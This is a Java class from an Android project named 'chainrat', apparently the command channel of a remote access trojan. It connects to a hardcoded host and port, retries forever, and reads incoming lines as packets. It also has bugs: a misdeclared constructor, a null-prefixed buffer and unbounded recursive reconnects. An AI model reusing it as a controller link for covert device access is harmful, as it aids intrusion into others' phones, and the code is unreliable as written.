package com.nefi.chainrat.networking;

import android.net.Network;
import android.os.NetworkOnMainThreadException;
import android.os.SystemClock;
import android.util.Log;
import com.nefi.chainrat.R;

import java.io.IOException;
import java.net.Socket;
import java.net.URI;
import java.net.UnknownHostException;
import java.util.Scanner;

public class IOSocket {

    private static final String TAG = "IOSocket";

    private String IP = "192.168.0.238";
    private int port = 4467;
    private String packet;

    Socket socket;
    Scanner inStream;

    public void IOSocket(){

    }

    public void connect(){
        try {
            Log.d(TAG, "Tryint to connect to: " + IP + ":" + port);
            socket = new Socket(IP, port);
            inStream = new Scanner(socket.getInputStream());
            Log.d(TAG, "Connected to: " + IP + ":" + port);
        }catch (NetworkOnMainThreadException ex){
            Log.d(TAG, "ERROR Connecting to: " + IP + ":" + port);
            Log.d(TAG, "FUCKME");
            SystemClock.sleep(1000);
            this.connect();
            ex.printStackTrace();
        }catch (Exception ex){
            Log.d(TAG, "ERROR Connecting to: " + IP + ":" + port);
            Log.d(TAG, "unnown error");
            SystemClock.sleep(1000);
            this.connect();
            ex.printStackTrace();
        }
    }

    public String read(){
        Log.d(TAG, "Tryint to read...");
        packet = null;
        if(!this.checkAlive()){
            this.connect();
            return null;
        }

        while(inStream.hasNextLine()){
            packet += inStream.nextLine();
        }
        return packet;
    }

    public boolean checkAlive(){
        boolean alive = false;
        try{
            alive = this.socket.getInetAddress().isReachable(1000);
        }catch (Exception ex){
            ex.printStackTrace();
            Log.d(TAG, "No connection alive");
        }
        return alive;
    }
}
